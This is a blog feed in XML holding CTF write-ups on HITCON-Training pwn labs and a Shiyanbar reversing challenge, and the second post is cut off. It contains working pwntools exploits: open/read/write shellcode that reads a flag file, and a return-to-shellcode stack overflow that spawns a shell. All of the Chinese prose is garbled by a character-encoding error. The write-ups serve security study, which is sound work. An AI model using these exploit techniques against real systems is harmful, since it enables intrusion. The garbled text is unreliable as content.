      <title>Pwn-10Êúà23-Hitcon(‰∏Ä)</title>
      <link href="/2018/10/23/Pwn-10%E6%9C%8823-Hitcon-%E4%B8%80/"/>
      <url>/2018/10/23/Pwn-10%E6%9C%8823-Hitcon-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Pwn-10Êúà23-Hitcon-‰∏Ä"><a href="#Pwn-10Êúà23-Hitcon-‰∏Ä" class="headerlink" title="Pwn-10Êúà23-Hitcon(‰∏Ä)"></a>Pwn-10Êúà23-Hitcon(‰∏Ä)</h1><blockquote><p>ÁªßÁª≠‰∫åËøõÂà∂‰øÆÁÇºÔºå‰ªäÂ§©ÂºÄÂßãËÇùHiton-trainingÔºåËÜúÁùÄ<a href="https://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">m4x</a>Ôºå‰ª•ÂèäÂè¶‰∏Ä‰ΩçÂ§ß‰Ω¨<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">23R3F</a>ÁöÑÈ¢òËß£ËπíË∑öÂâçË°å„ÄÇ</p></blockquote><h2 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h2><blockquote><p>Ë≤å‰ººÁ¨¨‰∏ÄÈ¢ò‰ºöÊØîËæÉÁÆÄÂçïÔºåÂÖàÁî®IDA-ProÈùôÊÄÅÂàÜÊûê‰∏Ä‰∏ãÔºö</p><p><img src="https://i.loli.net/2018/10/23/5bcf0b64c261c.png" alt=""></p><p>Ë≤å‰ººÁõ¥Êé•ÂæóÂà∞‰∫Ü‰∏Ä‰∏™ËÉΩÂ§üËæìÂá∫flagÁöÑÂáΩÊï∞ÔºüÁî±‰∫éËøôÊòØ‰∏™elf32‰ΩçÂèØÊâßË°åÊñá‰ª∂ÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÂú®linux‰∏ãÈù¢ÊâßË°åÔºö</p><p><img src="https://i.loli.net/2018/10/23/5bcf0332abc98.png" alt=""></p><p>ÂèØ‰ª•ÂæàÁÆÄÂçïÂ∞±ÁúãÊáÇÈÄªËæëÔºåËæìÂÖ•‰∏Ä‰∏™ÂÄºÔºåÁÑ∂ÂêéÊØîËæÉÂ¶ÇÊûúÁõ∏Á≠âÔºåÂæóÂá∫flag„ÄÇ</p></blockquote><h3 id="Ëß£Ê≥ï1-patch"><a href="#Ëß£Ê≥ï1-patch" class="headerlink" title="Ëß£Ê≥ï1 - patch"></a>Ëß£Ê≥ï1 - patch</h3><blockquote><p>IDA Pro ‚Äì keypatchÔºå‰ΩøÁî®<code>keypatch</code>Êèí‰ª∂Êù•‰øÆÊîπÊ±áÁºñ‰ª£Á†ÅÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•Â∞ÜÂÖ≥ÈîÆÁöÑ‰∏ÄÊ≠•nopÊéâÊàñËÄÖÊîπÊàêÂÆåÂÖ®Áõ∏ÂèçÁöÑÊìç‰Ωú„ÄÇ</p></blockquote><p><img src="https://i.loli.net/2018/10/23/5bcf05f6b8d06.png" alt=""></p><blockquote><p>‰æãÂ¶ÇÂ∞Ü<code>.text:08048722</code>ÁöÑË∑≥ËΩ¨Ê±áÁºñÊåá‰ª§Êîπ‰∏∫jmpÊó†Êù°‰ª∂Ë∑≥ËΩ¨ÔºåÊàñËÄÖÊòØ‰∏éjnzÁõ∏ÂèçÁöÑjzÊìç‰Ωú„ÄÇ</p><p><img src="https://i.loli.net/2018/10/23/5bcf075963ea4.png" alt=""></p><p><img src="https://i.loli.net/2018/10/23/5bcf07b5548dc.png" alt=""></p><p>‰øÆÊîπ‰∏∫Êó†Êù°‰ª∂Ë∑≥ËΩ¨ÂêéÈúÄË¶ÅÂ∞ÜÂÖ∂‰øùÂ≠òÂà∞ÂØπÂ∫îÊñá‰ª∂‰∏≠Ôºö<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf07f4c58d9.png" class="lazyload"></p><p>ÁÑ∂ÂêéÂéªÊääÊñá‰ª∂Êå™Âà∞linux‰∏äËøêË°åËØïËØïÂèëÁé∞Âπ∂Ê≤°ÊúâÁî®ÔºåÂõ†‰∏∫Êîπ‰∏∫jmpÂêéÂÖ∂ÂáΩÊï∞Áõ¥Êé•Â∞ë‰∫Ü‰∏ÄÈÉ®ÂàÜÂØπflagÁöÑÊìç‰ΩúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0a2f45481.png" class="lazyload"></p><p>ÊâÄ‰ª•Êàë‰ª¨Âè™ËÉΩÂ∞ÜÂéüÊ†∑Êú¨‰∏≠ÁöÑjnzÊîπ‰∏∫jz‰∫ÜÔºåÊîπÂÆå‰πãÂêéÂáΩÊï∞Â∑≤ÁªèÊàê‰∏∫‰∏çÁ≠âÂàôËæìÂá∫flag‰∫ÜÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0bd4dce1d.png" class="lazyload"></p><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0c1461b1f.png" class="lazyload"></p></blockquote><h3 id="Ëß£Ê≥ï2-gdb-set-register-value"><a href="#Ëß£Ê≥ï2-gdb-set-register-value" class="headerlink" title="Ëß£Ê≥ï2 - gdb set register value"></a>Ëß£Ê≥ï2 - gdb set register value</h3><blockquote><p>ÈÄöËøágdbÂä®ÊÄÅË∞ÉËØïÔºåÂπ∂‰∏îÂú®Âç≥Â∞ÜËøõË°åÊØîËæÉÂâçÔºåÂ∞Ü eaxÁΩÆ‰∏∫‰∏éedxÁõ∏ÂêåÁöÑÂÄºÂç≥ÂèØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0e78806d2.png" class="lazyload"></p><p>ÁÑ∂ÂêéÂç≥ÂèØÂæóÂà∞flag„ÄÇ</p></blockquote><h2 id="lab2-orw"><a href="#lab2-orw" class="headerlink" title="lab2-orw"></a>lab2-orw</h2><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p><code>checksec orw.bin</code>ÔºåÈ¢òÁõÆorwÁöÑÊÑèÊÄùÊòØopenÔºåreadÔºåwriteËøô‰∏â‰∏™ÂáΩÊï∞„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf0fca60256.png" class="lazyload"></p><p>emmmËøôÊòØÊàëÂÅöÁöÑÁ¨¨‰∏Ä‰∏™ÂºÄÂêØ‰∫ÜStack‰øùÊä§ÁöÑÈ¢òÁõÆÂë¢„ÄÇ</p></blockquote><h3 id="ÈÄªËæëÂàÜÊûê"><a href="#ÈÄªËæëÂàÜÊûê" class="headerlink" title="ÈÄªËæëÂàÜÊûê"></a>ÈÄªËæëÂàÜÊûê</h3><blockquote><p>ÁÆÄÂçïË∑ë‰∏Ä‰∏ãÂèØ‰ª•ÁúãÂà∞Áõ¥Êé•ÊòØËÆ©‰Ω†ËæìÂÖ•shellcodeÔºö<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf104eea350.png" class="lazyload"></p><p>ÊîæIDA proÈáåÈù¢ÁúãÁúãÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf15e2dd0aa.png" class="lazyload"></p><p>ÁªÜÁúã‰∏Ä‰∏ã<code>orw_seccomp()ÂáΩÊï∞</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf16ed762fb.png" class="lazyload"></p><p>prctlÂáΩÊï∞ÂèàÊòØÂï•Áé©ÊÑèÂÑøÔºüPrctl(Áî®Êà∑ÂíåÂÜÖÊ†∏Ê≤üÈÄöÁöÑ‰∏Ä‰∏™Áªù‰Ω≥ÂáΩÊï∞),Ëøô‰∏™ÂáΩÊï∞ÂèØ‰ª•ÂØπËøõÁ®ãËøõË°å‰∏Ä‰∫õËÆæÁΩÆ„ÄÇ<a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">ËÄåÊúâ‰∏ÄÈÅìÂº∫ÁΩëÊùØÈ¢òÁõÆÂ∞±Â•ΩÂÉèÁî®‰∫ÜËøôÁé©ÊÑèÂÑøÁöÑÊäÄÊúØÔºü</a></p><p>ËæìÂÖ•shellcode‰πãÂêéÂ∫îËØ•‰ºöÊâßË°åÔºåÊâÄ‰ª•ËøôÈ¢òÁöÑÁõÆÁöÑÊòØËÆ©Êàë‰ª¨Ëá™Â∑±ÊûÑÈÄ†shellcodeÂéªËØªÂèñflagÔºüÊó¢ÁÑ∂Ë¶ÅÊûÑÈÄ†shellcodeÔºåÈÇ£Â∞±ÈúÄË¶ÅÁî®Âà∞pwntoolsÁöÑasmÊ®°ÂùóÂíåshellcraftÊ®°ÂùóÔºö</p><p>asmÊ®°ÂùóÊòØÂ∞ÜÊìç‰ΩúËΩ¨Êç¢‰∏∫Ê±áÁºñÂëΩ‰ª§ÔºåËÄåshellcraftÊòØÂÖ∑ÊúâÂêÑÁßçÂáΩÊï∞ÂØπÂ∫îÊ±áÁºñÂëΩ‰ª§ÁöÑ‰∏Ä‰∏™Ê®°ÂùóÔºåÂçÅÂàÜÂ•ΩÁî®Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf1996469a4.png" class="lazyload"></p><p>pwntools‰∏≠ÁöÑcontextÊ®°ÂùóÂèàÊòØÁî®Êù•Âπ≤ÂòõÁöÑÂë¢Ôºü</p><p><code>context</code>ÊòØpwntoolsÁî®Êù•ËÆæÁΩÆÁéØÂ¢ÉÁöÑÂäüËÉΩ„ÄÇÂú®ÂæàÂ§öÊó∂ÂÄôÔºåÁî±‰∫é‰∫åËøõÂà∂Êñá‰ª∂ÁöÑÊÉÖÂÜµ‰∏çÂêåÔºåÊàë‰ª¨ÂèØËÉΩÈúÄË¶ÅËøõË°å‰∏Ä‰∫õÁéØÂ¢ÉËÆæÁΩÆÊâçËÉΩÂ§üÊ≠£Â∏∏ËøêË°åexpÔºåÊØîÂ¶ÇÊúâ‰∏Ä‰∫õÈúÄË¶ÅËøõË°åÊ±áÁºñÔºå‰ΩÜÊòØ32ÁöÑÊ±áÁºñÂíå64ÁöÑÊ±áÁºñ‰∏çÂêåÔºåÂ¶ÇÊûú‰∏çËÆæÁΩÆcontext‰ºöÂØºËá¥‰∏Ä‰∫õÈóÆÈ¢ò„ÄÇ</p><p>‰æãÂ¶Ç<code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</code></p><p>ËøôÂè•ËØùÁöÑÊÑèÊÄùÊòØÔºö </p><ol><li>osËÆæÁΩÆÁ≥ªÁªü‰∏∫linuxÁ≥ªÁªüÔºåÂú®ÂÆåÊàêctfÈ¢òÁõÆÁöÑÊó∂ÂÄôÔºåÂ§ßÂ§öÊï∞pwnÈ¢òÁõÆÁöÑÁ≥ªÁªüÈÉΩÊòØlinux </li><li>archËÆæÁΩÆÊû∂ÊûÑ‰∏∫amd64ÔºåÂèØ‰ª•ÁÆÄÂçïÁöÑËÆ§‰∏∫ËÆæÁΩÆ‰∏∫64‰ΩçÁöÑÊ®°ÂºèÔºåÂØπÂ∫îÁöÑ32‰ΩçÊ®°ÂºèÊòØ‚Äôi386‚Äô </li><li>log_levelËÆæÁΩÆÊó•ÂøóËæìÂá∫ÁöÑÁ≠âÁ∫ß‰∏∫debugÔºåËøôÂè•ËØùÂú®Ë∞ÉËØïÁöÑÊó∂ÂÄô‰∏ÄËà¨‰ºöËÆæÁΩÆÔºåËøôÊ†∑pwntools‰ºöÂ∞ÜÂÆåÊï¥ÁöÑioËøáÁ®ãÈÉΩÊâìÂç∞‰∏ãÊù•Ôºå‰ΩøÂæóË∞ÉËØïÊõ¥Âä†Êñπ‰æøÔºåÂèØ‰ª•ÈÅøÂÖçÂú®ÂÆåÊàêCTFÈ¢òÁõÆÊó∂Âá∫Áé∞‰∏Ä‰∫õÂíåIOÁõ∏ÂÖ≥ÁöÑÈîôËØØ„ÄÇ</li></ol></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>Ê†πÊçÆÈ¢òÊÑèÂíåÈ¢òËß£üòÇÔºàÊ≠£Â§Ñ‰∫éÊ∂®ÂßøÂäøÁöÑÊó∂ÂÄôÔºâÂÜôÂá∫expÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> shellcraft <span class="token keyword">as</span> sccontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> sc<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span><span class="token string">"/home/xiaoyifeng/ctf/pwn/Hiton/lab2/flag"</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"esp"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  openËøîÂõûÁöÑÊñá‰ª∂Êñá‰ª∂ÊèèËø∞Á¨¶Â≠òË¥ÆÂú®eaxÂØÑÂ≠òÂô®Èáå </span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"eax"</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  openËØªÂèñÁöÑÂÜÖÂÆπÊîæÂú®Ê†àÈ°∂ </span><span class="token comment" spellcheck="true">#  writeÂáΩÊï∞Âú®Ê†àÈ°∂ËØªÂèñ0x100Â§ßÂ∞èÁöÑÂÜÖÂÆπÂπ∂ÊâìÂç∞Âá∫Êù•</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./orw.bin"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(asm(shellcode))</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"shellcode:"</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf2cbec3db2.png" class="lazyload"></p><h2 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h2><blockquote><p>È¢òÁõÆÂêçÊòØreturn to shellcodeÁöÑÁÆÄÂÜôÔºåÂ∫îËØ•ÊòØÂà©Áî®returnËøîÂõûÁÑ∂ÂêéÊâßË°åshellcode‰πãÁ±ªÁöÑÊìç‰ΩúÔºü</p></blockquote><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ-1"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ-1" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p><code>checksec ret2sc</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf21774fa88.png" class="lazyload"></p><p>emmmÊ≤°ÊúâÂºÄÂêØÂï•‰øùÊä§ÔºåÊ≤°ÊúâÂºÄÂêØÊ†àÊ∫¢Âá∫Ê£ÄÊµãÔºå‰πüÊ≤°ÊúâÂºÄÂêØÊ†à‰∏çÂèØÊâßË°åÔºàNXÔºâ„ÄÇ</p></blockquote><h3 id="ÈÄªËæëÂàÜÊûê-1"><a href="#ÈÄªËæëÂàÜÊûê-1" class="headerlink" title="ÈÄªËæëÂàÜÊûê"></a>ÈÄªËæëÂàÜÊûê</h3><blockquote><p>Ë∑ë‰∏Ä‰∏ãÂèëÁé∞ËÆ©Êàë‰ª¨ËæìÂÖ•Â≠óÁ¨¶‰∏≤Âà∞NameÈáåÈù¢ÔºåËøòÊúâ‰∏Ä‰∏™try your bestÔºüÈ¶ñÂÖàÊÉ≥Âà∞ÁöÑÊòØ‰ºö‰∏ç‰ºöÂèàÊòØÂï•Ê†àÊ∫¢Âá∫‰ªÄ‰πàÁöÑ„ÄÇ</p></blockquote><blockquote><p> <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf212fdd23f.png" class="lazyload"></p></blockquote><blockquote><p>ÂóØÔºåÊÉÖÂÜµÊòØÊúâÁöÑÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf22016964b.png" class="lazyload"></p><p>ÈÄöËøágdbÂä®ÊÄÅË∞ÉËØïÂèØ‰ª•ÂèëÁé∞Âú®ËæìÂÖ•try your best ÁöÑÂÄºÁöÑÊó∂ÂÄôÂèØ‰ª•ÂèëÁîüÊ∫¢Âá∫ÔºåÂπ∂‰∏îÂ∞ÜEIPÊåáÂêëÊàë‰ª¨ÊûÑÈÄ†ÁöÑ‰ΩçÁΩÆÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf25189cf77.png" class="lazyload"></p><p>ËÄåËøô‰∏™‰∏¥ÁïåÂÄºÊàë‰ª¨ÂèØ‰ª•ÈÄöËøápattern searchÊù•Êü•Êàë‰ª¨ÊûÑÈÄ†ÁöÑpatternÂÅèÁßªÈáèÔºåÂæóÂà∞‰∏∫32„ÄÇÊ†πÊçÆÂ§ß‰Ω¨ÁöÑÈ¢òËß£‰∫ÜËß£Âà∞return to shellcodeÊòØ‰∏ÄÁßçÈ¢òÂûãÔºåÊàëÁîöËá≥ÊÉ≥Âà∞‰∫ÜÂèàÁî®ROP chain???<code>Èªë‰∫∫ÈóÆÂè∑.jpg</code>üò≠„ÄÇ</p><p>ÂéüÊù•return to shellcodeÁöÑÊìç‰ΩúÂ∞±ÊòØÂ∞ÜshellcodeÂÜôÂÖ•nameÂèòÈáèÁ©∫Èó¥ÔºåÁÑ∂ÂêéÈÄöËøáËøîÂõûÂà∞ËØ•Âú∞ÂùÄ‰ªéËÄåÊâßË°åshellcode(NXÊú™ÂºÄÂêØÔºåÊ†àÂèØÊâßË°å)</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf2a86e5630.png" class="lazyload"></p><p>ËØ•ÂèòÈáèÂú∞ÂùÄ‰∏∫0x804A060</p></blockquote><h3 id="ÊûÑÈÄ†EXP"><a href="#ÊûÑÈÄ†EXP" class="headerlink" title="ÊûÑÈÄ†EXP"></a>ÊûÑÈÄ†EXP</h3><blockquote><p>Ëøô‰∏™expÈúÄË¶ÅÁî®Âà∞shellcraftÂíåasmÔºåÊù•Â∞ÜshellcodeËΩ¨‰∏∫Ê±áÁºñÊåá‰ª§Ôºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2sc"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#Ëé∑ÂæóshÁöÑÂëΩ‰ª§Â§öÁßçÂ§öÊ†∑ÔºåÂπ∂‰∏îÊúâ‰∏çÂêåÁ≥ªÁªüÁâàÊú¨ÁöÑsh</span><span class="token comment" spellcheck="true">#shellcode = asm(shellcraft.execve("/bin/sh"))</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#flatÊ®°ÂùóËÉΩÂ∞ÜpatternÂ≠óÁ¨¶‰∏≤ÂíåÂú∞ÂùÄÁªìÂêàÂπ∂‰∏îËΩ¨‰∏∫Â≠óËäÇÊ®°Âºè</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x804a060</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûúÔºö</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf2c13d7442.png" class="lazyload"></p><h2 id="Â∞èÁªì"><a href="#Â∞èÁªì" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h2><p>ÂÜÖÂÆπÊ∂âÂèä context Ê®°ÂºèËÆæÁΩÆÔºåasmÊ®°ÂùóÔºåshellcraftÊ®°ÂùóÔºåpatchÊìç‰ΩúÔºåreturn to shellcodeÈ¢òÂûãÔºåpwntools flatÊ®°Âùó„ÄÇ</p><p>‰ªäÂ§©ÂÖàÊ∑∑Âà∞ËøôÂÑø„ÄÇ„ÄÇ„ÄÇÊàëÁúüËèúüò≠„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Re-10Êúà22-shiyanbar-10000</title>
      <link href="/2018/10/22/Re-10%E6%9C%8822-shiyanbar-10000/"/>
      <url>/2018/10/22/Re-10%E6%9C%8822-shiyanbar-10000/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Re-10Êúà22-shiyanbar-10000"><a href="#Re-10Êúà22-shiyanbar-10000" class="headerlink" title="Re-10Êúà22-shiyanbar-10000"></a>Re-10Êúà22-shiyanbar-10000</h1><blockquote><p>emmmËÆ∞ÂΩï‰∏Ä‰∏ãÂÆûÈ™åÂêßÈáå‰∏ÄÈÅìÁÆÄÂçïÁöÑÈÄÜÂêëÔºåÂÆûÈôÖ‰∏äÂ∞±ÊòØ‰∏ÄÁßçÊÄùÁª¥ÊñπÂºè„ÄÇ</p></blockquote><blockquote><p>ÊãøÂà∞‰∏Ä‰∏™exeÊñá‰ª∂,ËøêË°åÊïàÊûúÂ¶Ç‰∏ãÔºö</p><p><img src="https://i.loli.net/2018/10/22/5bcd6ebe22927.png" alt=""></p><p>ÂØπÊ≤°ÈîôÂ∞±ÊòØ‰∏Ä‰∏™ÂñµÂ≠óÔºåÁÑ∂ÂêéËæìÂÖ•ÂÜÖÂÆπÔºå‰ºöËæìÂá∫wrongÔºåÂèØ‰ª•ÁåúÊµãËæìÂÖ•‰∫ÜÊ≠£Á°ÆÁöÑÂ≠óÁ¨¶Âêé‰ºöËæìÂá∫good„ÄÇ</p></blockquote><h2 id="ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"><a href="#ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë" class="headerlink" title="ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë"></a>ÈùôÊÄÅÂàÜÊûêÁ®ãÂ∫èÈÄªËæë</h2><blockquote><p>‰ª§‰∫∫ÁªùÊúõÁöÑÊòØÔºåida6.8Âíåida7.0ÂØπÊ≠§Á®ãÂ∫èmainÂáΩÊï∞ÂàÜÊûêÁöÑ‰º™‰ª£Á†ÅÂ±ÖÁÑ∂‰∏çÂêåÔºåËøôÈáåÊàë‰ª¨Áúã7.0ÁöÑÔºö</p><p><img src="https://i.loli.net/2018/10/22/5bcd72ad9ac34.png" alt=""></p><p>ÁÆÄÂçïÂàÜÊûêÂèØ‰ª•Áü•ÈÅìÔºåËøôÈáåÊòØÂ∞ÜÊàë‰ª¨ÁöÑËæìÂÖ•ÊåâÂ≠óËäÇ‰∏é0x80uËøõË°åÊàñÊìç‰ΩúÔºåÂç≥Êåâ‰ΩçÊàñÔºåÁÑ∂ÂêéÂØπÂ§ÑÁêÜÂêéÁöÑÂÜÖÂÆπËøõË°åÂ≠óÁ¨¶‰∏≤ÊØîËæÉÔºåÁÑ∂ÂêéÂæóÂá∫ÁªìÊûú„ÄÇ‰∏äÂõæ‰∏≠ÁöÑv4Âà∞v16ÂÆûÈôÖ‰∏äÈÉΩÊòØ‰∏ãÂõæ‰∏≠ÁöÑ16ËøõÂà∂ËΩ¨‰∏∫Êï¥ÂûãÁöÑÂÜÖÂÆπÔºåÂõ†‰∏∫‰∏Ä‰∏™Â≠óËäÇÂèØ‰ª•Ë°®Á§∫ÁöÑÊï∞Â≠óËåÉÂõ¥‰∏∫-128Âà∞127„ÄÇ</p><p><img src="https://i.loli.net/2018/10/22/5bcd71a486530.png" alt=""></p><p>ÁÑ∂ÂêéÊàëÂ∞±Ë¶ÅÂÇªÈÄºüò≠Âú∞ËØ¥ÔºåËøô‰∫õÂÜÖÂÆπËÇØÂÆöË∑üÊØîËæÉÊòØÊúâÂÖ≥Á≥ªÁöÑ„ÄÇ</p><p>ËØïËØïÂ∞Ü0xe6‰∏é0x80</p><p>Êàë‰ª¨Ê≥®ÊÑèÂà∞<code>.text:004013F8</code>‰ΩçÁΩÆÁöÑÂëΩ‰ª§ÊòØÂ∞Üeax‰∏é0xFFFFFF80Áõ∏ÊàñÔºå‰∏∫Âï•Êàë‰ª¨ÁöÑ‰º™‰ª£Á†Å‰∏≠Âç¥ÊòØ‰∏é0x80uÁõ∏ÊàñÂë¢ÔºüÂõ†‰∏∫Êàë‰ª¨ÊòØÊåâÂ≠óËäÇÊù•ËøõË°åÊàñÊìç‰ΩúÔºåÊâÄ‰ª•0xFFFFFF80ÂâçÈù¢ÁöÑ‰∏â‰∏™Â≠óËäÇ‰πüÂ∞±Ê≤°Êúâ‰∫ÜÂøÖË¶Å„ÄÇ</p><p>ÂîâÂÆûÂú®ÊòØËøôÈ¢òÁõÆÈÄªËæëÂ§™Âê´Á≥ä‰∏çÊ∏ÖÔºàÂèØËÉΩÊòØÊàëÂ§™Ëèú‚î≠‚îÆÔπè‚î≠‚îÆÔºâ</p></blockquote><h2 id="Âä®ÊÄÅÁ®ãÂ∫èÈÄªËæëÂàÜÊûê"><a href="#Âä®ÊÄÅÁ®ãÂ∫èÈÄªËæëÂàÜÊûê" class="headerlink" title="Âä®ÊÄÅÁ®ãÂ∫èÈÄªËæëÂàÜÊûê"></a>Âä®ÊÄÅÁ®ãÂ∫èÈÄªËæëÂàÜÊûê</h2><blockquote><p>ÈÄöËøáollydbgÊàë‰ª¨Êù•ËøõË°åÂä®ÊÄÅË∞ÉËØïÔºåÈ¶ñÂÖàËΩΩÂÖ•Á®ãÂ∫èÔºåÊü•ÊâæÂ≠óÁ¨¶‰∏≤Ôºö</p><p><img src="https://i.loli.net/2018/10/22/5bcd7825508d0.png" alt=""></p><p>ÁÑ∂ÂêéÊàë‰ª¨Êâæ‰∏Ä‰∏ã‚ÄùÂñµ‚ÄùÔºåÂá∫Áé∞ÁöÑ‰ΩçÁΩÆÔºåÂπ∂‰∏îÂú®ÊâæÂà∞ÁöÑÂ≠óÁ¨¶‰∏≤ÊØîËæÉÂáΩÊï∞‰∏ãÊñ≠ÁÇπÔºö</p><p><img src="https://i.loli.net/2018/10/22/5bcd78b3669b0.png" alt=""></p><p>ÁÑ∂ÂêéËøêË°åÔºåÂπ∂‰∏îÈöè‰æøËæìÂÖ•‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd790b40671.png" 